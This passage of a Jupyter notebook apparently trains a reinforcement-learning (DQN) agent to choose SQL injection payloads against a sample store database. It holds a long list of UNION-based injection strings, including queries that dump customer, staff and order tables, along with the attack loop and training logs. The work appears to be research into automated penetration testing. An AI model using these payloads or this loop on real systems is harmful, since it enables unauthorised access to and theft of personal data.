       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX'#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\",\n",
       " \"' UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL FROM production.stocks--\",\n",
       " \"' UNION SELECT category_id, category_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.categories--\",\n",
       " \"' UNION SELECT brand_id, brand_name, NULL, NULL, NULL, NULL, NULL, NULL, NULL FROM production.brands--\",\n",
       " \"' UNION SELECT product_id, product_name, brand_id, category_id, model_year, list_price, NULL, NULL, NULL FROM production.products--\",\n",
       " \"' UNION SELECT customer_id, first_name, last_name, phone, email, street, city, state, zip_code FROM sales.customers--\",\n",
       " \"' UNION SELECT store_id, store_name, phone, email, street, city, state, zip_code, NULL FROM sales.stores--\",\n",
       " \"' UNION SELECT staff_id, first_name, last_name, email, phone, active, store_id, manager_id, NULL FROM sales.staffs--\",\n",
       " \"' UNION SELECT order_id, customer_id, order_status, order_date, required_date, shipped_date, store_id, staff_id, NULL FROM sales.orders--\",\n",
       " \"' UNION SELECT order_id, item_id, product_id, quantity, list_price, discount, NULL, NULL, NULL FROM sales.order_items--\",\n",
       " \"' UNION SELECT store_id, product_id, quantity, NULL, NULL, NULL, NULL, NULL, NULL FROM production.stocks--\"]"
      ]
     },
     "execution_count": 235,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Payloads extracted from generic error and union sections from: https://github.com/payloadbox/sql-injection-payload-list\n",
    "# TODO: Remove non-MSSQL payloads.\n",
    "payloads = open('sqli_payloads.txt', 'r').read().split('\\n')\n",
    "\n",
    "for context_col_count in context_col_counts:\n",
    "    for i in range(0, len(tables)):\n",
    "        payload = '\\' UNION SELECT '\n",
    "        table = tables[i]\n",
    "        table_columns = columns[i]\n",
    "        table_col_count = len(table_columns)\n",
    "\n",
    "        for i in range(0, context_col_count):\n",
    "            if i < table_col_count:\n",
    "                payload += table_columns[i]\n",
    "            else:\n",
    "                payload += 'NULL'\n",
    "            if i < context_col_count - 1:\n",
    "                payload += ', '\n",
    "        \n",
    "        payload += f' FROM {table}--'\n",
    "        payloads.append(payload)\n",
    "\n",
    "payloads"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Link SQL Injection Attacks to Action Space"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 236,
   "metadata": {},
   "outputs": [],
   "source": [
    "reward_success = 1\n",
    "reward_end = 10\n",
    "reward_norm = -1\n",
    "# Reward for invalid action.\n",
    "reward_mask = -1\n",
    "\n",
    "# Perfoms an SQL injection attack based on an index from the list of payloads.\n",
    "def perform_action(payload_index):\n",
    "    payload = payloads[payload_index]\n",
    "    reward = reward_norm\n",
    "    episode_over = False\n",
    "\n",
    "    try:\n",
    "        df = inject_payload(payload, context)\n",
    "        # Check episode termination condition, and if true, apply appropriate reward.\n",
    "        # An episode will terminate once the goal of the final context is reached.\n",
    "        # TODO: Ensure tables are filtered as the same column name could exist in another table.\n",
    "\n",
    "        #for column in context['column_filter']:\n",
    "        #    if column in df and context['goal'] in df[column].values:\n",
    "\n",
    "        if context['goal'] in df.values:\n",
    "            if context_index < len(contexts) - 1:\n",
    "                reward = reward_success\n",
    "                increment_context()\n",
    "            else:\n",
    "                reward = reward_end\n",
    "                episode_over = True\n",
    "\n",
    "        res = df.to_csv()\n",
    "        has_error = False\n",
    "    except:\n",
    "        # Record error as a String.\n",
    "        res = str(sys.exc_info()[1])\n",
    "        has_error = True\n",
    "    \n",
    "    res = bytearray(res, 'ascii')\n",
    "    res = hashlib.md5(res).digest()\n",
    "    res = list(res)\n",
    "\n",
    "    # Add error information if this is set.\n",
    "    if mark_error:\n",
    "        res.append(int(has_error))\n",
    "\n",
    "    res = np.array(res, dtype='float32')\n",
    "\n",
    "    return res, reward, episode_over"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 237,
   "metadata": {},
   "outputs": [],
   "source": [
    "def update_state(state, res):\n",
    "    state = deque(state)\n",
    "    state.rotate(action_result_size)\n",
    "    state = np.array(state)\n",
    "    return np.concatenate((res, state[len(res):]))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "DQN (Adapted from https://keras.io/examples/rl/deep_q_network_breakout/)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 238,
   "metadata": {},
   "outputs": [],
   "source": [
    "gamma = 0.99  # Discount factor for past rewards\n",
    "starting_epsilon = 1.0\n",
    "epsilon = starting_epsilon  # Epsilon greedy parameter\n",
    "epsilon_min = 0.1 # Minimum epsilon greedy parameter\n",
    "epsilon_max = 1.0  # Maximum epsilon greedy parameter\n",
    "epsilon_interval = (\n",
    "    epsilon_max - epsilon_min\n",
    ")  # Rate at which to reduce chance of random action being taken\n",
    "learning_rate = 0.001\n",
    "batch_size = 32  # Size of batch taken from replay buffer\n",
    "max_steps_per_episode = 10000\n",
    "training_episodes = 100\n",
    "test_episodes = 50\n",
    "episodes = training_episodes + test_episodes\n",
    "\n",
    "results_in_state = 4\n",
    "features = action_result_size * results_in_state\n",
    "\n",
    "num_actions = len(payloads)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 239,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Model: \"sequential_24\"\n",
      "_________________________________________________________________\n",
      " Layer (type)                Output Shape              Param #   \n",
      "=================================================================\n",
      " flatten_24 (Flatten)        (32, 68)                  0         \n",
      "                                                                 \n",
      " dense_96 (Dense)            (32, 128)                 8832      \n",
      "                                                                 \n",
      " dense_97 (Dense)            (32, 128)                 16512     \n",
      "                                                                 \n",
      " dense_98 (Dense)            (32, 128)                 16512     \n",
      "                                                                 \n",
      " dense_99 (Dense)            (32, 500)                 64500     \n",
      "                                                                 \n",
      "=================================================================\n",
      "Total params: 106,356\n",
      "Trainable params: 106,356\n",
      "Non-trainable params: 0\n",
      "_________________________________________________________________\n"
     ]
    }
   ],
   "source": [
    "def create_q_model(batch_size):\n",
    "    return keras.Sequential([\n",
    "        layers.Input(shape=(features, 1), batch_size=batch_size),\n",
    "        layers.Flatten(),\n",
    "        layers.Dense(128, activation='relu'),\n",
    "        layers.Dense(128, activation='relu'),\n",
    "        layers.Dense(128, activation='relu'),\n",
    "        layers.Dense(num_actions, activation='linear')\n",
    "    ])\n",
    "\n",
    "# The first model makes the predictions for Q-values which are used to\n",
    "# make an action.\n",
    "model = create_q_model(1)\n",
    "model.compile(optimizer='adam')\n",
    "# Build a target model for the prediction of future rewards.\n",
    "# The weights of a target model get updated every 10000 steps thus when the\n",
    "# loss between the Q-values is calculated the target Q-value is stable.\n",
    "model_target = create_q_model(batch_size)\n",
    "model_target.compile(optimizer='adam')\n",
    "model_target.summary()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 240,
   "metadata": {},
   "outputs": [],
   "source": [
    "class EpisodeAnalytics:\n",
    "    def __init__(self):\n",
    "        self.actions = []\n",
    "        self.attempts = []\n",
    "        self.timings = []\n",
    "    \n",
    "    def record_success(self, action, num_actions_attempted, time_taken):\n",
    "        self.actions.append(action)\n",
    "        self.attempts.append(num_actions_attempted)\n",
    "        self.timings.append(time_taken)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 241,
   "metadata": {},
   "outputs": [],
   "source": [
    "class DQNAnalytics:\n",
    "    def __init__(self):\n",
    "        self.analytics_start_time = time.time_ns()\n",
    "        self.episode_data = []\n",
    "\n",
    "    def begin_episode(self):\n",
    "        self.episode_data.append(EpisodeAnalytics())\n",
    "        self.start_time = time.time_ns()\n",
    "        self.attempts = 0\n",
    "\n",
    "    def add_attempt(self):\n",
    "        self.attempts += 1\n",
    "\n",
    "    def record_success(self, action):\n",
    "        time_taken = time.time_ns() - self.start_time\n",
    "        self.episode_data[len(self.episode_data)-1] \\\n",
    "            .record_success(action, self.attempts, time_taken)\n",
    "        self.attempts = 0\n",
    "\n",
    "    def _get_episodes_array(self):\n",
    "        return [i for i in range(1, episodes+1)]\n",
    "\n",
    "    def _plot_remainder_and_show(self):\n",
    "        plt.title(f'γ = {gamma}, ε ∈ [{epsilon_min}, {epsilon_max}] Starting at ε = {starting_epsilon}, α = {learning_rate}')\n",
    "        plt.xlabel('Episode')\n",
    "        plt.axvline(x=training_episodes, color='m', label = 'Training End', linestyle='--')\n",
    "        plt.legend()\n",
    "        plt.show()\n",
    "    \n",
    "    def plot_avg_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_attempts = [np.average(ed.attempts) if len(ed.attempts) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_attempts, marker='^')\n",
    "        plt.suptitle('Average Attempts for Goals Found per Episode')\n",
    "        plt.ylabel('Average Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_attempts(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_attempts = [ed.attempts[i] if i < len(ed.attempts) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_attempts, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Attempts per Goal Found per Episode')\n",
    "        plt.ylabel('Attempts')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_avg_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        avg_timings = [np.average(ed.timings)/1000000000 if len(ed.timings) != 0 else None for ed in self.episode_data]\n",
    "        plt.scatter(episodes, avg_timings, marker='^')\n",
    "        plt.suptitle('Average Time Taken in Seconds for Goals Found per Episode')\n",
    "        plt.ylabel('Average Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def plot_context_timings(self):\n",
    "        episodes = self._get_episodes_array()\n",
    "        for i in range(0, len(contexts)):\n",
    "            context_timings = [ed.timings[i]/1000000000 if i < len(ed.timings) else None for ed in self.episode_data]\n",
    "            plt.scatter(episodes, context_timings, label=f'Context {i+1}', marker='^')\n",
    "        plt.suptitle('Time Taken in Seconds per Goals Found per Episode')\n",
    "        plt.ylabel('Time Taken (s)')\n",
    "        self._plot_remainder_and_show()\n",
    "\n",
    "    def get_test_payloads(self):\n",
    "        indices = []\n",
    "        episode_actions = []\n",
    "        for i in range(training_episodes, episodes):\n",
    "            indices.append(f'Episode {i+1}')\n",
    "            curr_episode_data = self.episode_data[i]\n",
    "            curr_episode_actions = [payloads[curr_episode_data.actions[j]] if j < len(curr_episode_data.actions) else 'N/A' for j in range(len(contexts))]\n",
    "            episode_actions.append(curr_episode_actions)\n",
    "        \n",
    "        column_names = [f'Context {i+1}' for i in range(len(contexts))]\n",
    "        columns = [[] for i in range(len(contexts))]\n",
    "        for actions in episode_actions:\n",
    "            for i in range(len(actions)):\n",
    "                columns[i].append(actions[i])\n",
    "\n",
    "        table = {}\n",
    "        for i in range(len(contexts)):\n",
    "            table[column_names[i]] = columns[i]\n",
    "\n",
    "        df = pd.DataFrame(table, index=indices)\n",
    "        return df\n",
    "\n",
    "    def stop_analytics(self):\n",
    "        self.analytics_run_time = time.time_ns() - self.analytics_start_time\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Create All Possible Payloads (Action Space)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 242,
   "metadata": {},
   "outputs": [],
   "source": [
    "def create_empty_state():\n",
    "    return np.array([0] * features, dtype='float32')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 243,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: 0.00\t Episode 1\t Frame count: 25\t Context: 2\n",
      "Running reward: 0.00\t Episode 1\t Frame count: 87\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -74.00\t Episode 2\t Frame count: 780\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -74.00\t Episode 2\t Frame count: 1332\t Context: 2\n",
      "Running reward: -653.00\t Episode 3\t Frame count: 1393\t Context: 2\n",
      "Running reward: -653.00\t Episode 3\t Frame count: 1416\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -459.00\t Episode 4\t Frame count: 2018\t Context: 2\n",
      "Running reward: -459.00\t Episode 4\t Frame count: 2051\t Context: 2\n",
      "Running reward: -499.75\t Episode 5\t Frame count: 2137\t Context: 2\n",
      "Running reward: -499.75\t Episode 5\t Frame count: 2173\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -421.60\t Episode 6\t Frame count: 2352\t Context: 2\n",
      "Running reward: -421.60\t Episode 6\t Frame count: 2499\t Context: 2\n",
      "Running reward: -403.50\t Episode 7\t Frame count: 2841\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -403.50\t Episode 7\t Frame count: 3319\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -461.14\t Episode 8\t Frame count: 3632\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -461.14\t Episode 8\t Frame count: 4430\t Context: 2\n",
      "Running reward: -540.75\t Episode 9\t Frame count: 4449\t Context: 2\n",
      "Running reward: -540.75\t Episode 9\t Frame count: 4720\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -511.44\t Episode 10\t Frame count: 5042\t Context: 2\n",
      "Running reward: -511.44\t Episode 10\t Frame count: 5424\t Context: 2\n",
      "Running reward: -529.40\t Episode 11\t Frame count: 5695\t Context: 2\n",
      "Running reward: -529.40\t Episode 11\t Frame count: 5750\t Context: 2\n",
      "Running reward: -509.73\t Episode 12\t Frame count: 5814\t Context: 2\n",
      "Running reward: -509.73\t Episode 12\t Frame count: 5828\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -472.67\t Episode 13\t Frame count: 6343\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -472.67\t Episode 13\t Frame count: 7058\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -529.92\t Episode 14\t Frame count: 7524\t Context: 2\n",
      "Running reward: -529.92\t Episode 14\t Frame count: 7583\t Context: 2\n",
      "Running reward: -528.64\t Episode 15\t Frame count: 7799\t Context: 2\n",
      "Running reward: -528.64\t Episode 15\t Frame count: 8062\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -524.47\t Episode 16\t Frame count: 8165\t Context: 2\n",
      "Running reward: -524.47\t Episode 16\t Frame count: 8262\t Context: 2\n",
      "Running reward: -503.38\t Episode 17\t Frame count: 8459\t Context: 2\n",
      "Running reward: -503.38\t Episode 17\t Frame count: 8810\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n",
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -505.24\t Episode 18\t Frame count: 9958\t Context: 2\n",
      "Running reward: -505.24\t Episode 18\t Frame count: 9962\t Context: 2\n",
      "Running reward: -540.44\t Episode 19\t Frame count: 10178\t Context: 2\n",
      "Running reward: -540.44\t Episode 19\t Frame count: 10199\t Context: 2\n",
      "Running reward: -523.79\t Episode 20\t Frame count: 10329\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "C:\\Users\\ilija\\AppData\\Local\\Temp\\ipykernel_16848\\1381392522.py:22: FutureWarning: elementwise comparison failed; returning scalar instead, but in the future will perform elementwise comparison\n",
      "  if context['goal'] in df.values:\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running reward: -523.79\t Episode 20\t Frame count: 10441\t Context: 2\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
